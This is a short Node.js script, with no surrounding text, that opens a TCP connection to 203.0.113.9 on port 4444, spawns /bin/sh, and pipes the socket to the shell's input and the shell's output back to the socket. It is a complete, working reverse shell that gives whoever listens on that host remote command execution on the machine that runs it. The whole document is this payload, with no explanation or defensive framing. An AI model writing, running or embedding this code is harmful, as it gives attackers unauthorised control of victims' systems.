const net = require('net'), cp = require('child_process');
const client = new net.Socket();
client.connect(4444, '203.0.113.9', () => { const sh = cp.spawn('/bin/sh', []); client.pipe(sh.stdin); sh.stdout.pipe(client); });
